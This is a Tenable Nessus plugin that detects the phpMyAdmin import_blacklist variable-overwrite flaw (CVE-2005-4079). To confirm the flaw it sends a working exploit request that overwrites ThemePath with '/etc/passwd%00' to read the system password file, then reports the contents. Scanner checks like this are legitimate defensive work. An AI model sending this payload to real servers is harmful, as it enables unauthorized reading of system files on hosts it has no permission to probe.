#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
multiple issues. 

Description :

The version of phpMyAdmin installed on the remote host fails to
properly protect the global 'import_blacklist' variable, which is used
in the 'libraries/grab_globals.lib.php' script to protect global
variables in its register_globals emulation layer.  An unauthenticated
attacker can exploit this flaw to overwrite arbitrary variables,
thereby opening the application up to remote / local file include as
well as cross-site scripting attacks. 

See also :

http://www.hardened-php.net/advisory_252005.110.html
http://archives.neohapsis.com/archives/fulldisclosure/2005-12/0247.html
http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-9

Solution :

Upgrade to phpMyAdmin version 2.7.0-pl1 or later. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description)
{
  script_id(22124);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-4079");
  script_bugtraq_id(15761);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"21508");

  script_name(english:"phpMyAdmin import_blacklist Variable Overwriting Vulnerability");
  script_summary(english:"Tries to read a local file using phpMyAdmin");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/css/phpmyadmin.css.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("li#li_pma_homepage" >< res)
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd%00";
    postdata = string(
      "usesubform[1]=&",
      "subform[1][GLOBALS][cfg][ThemePath]=", file
    );
    req = string(
      "POST ", url, "?import_blacklist[0]=/", SCRIPT_NAME, "/ HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, "img.lightbulb");
        if (contents) contents = strstr(contents, "}");
        if (contents) contents = contents - "}";
      }

      if (contents)
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = desc;

      security_note(port:port, data:report);
      exit(0);
    }
  }
}
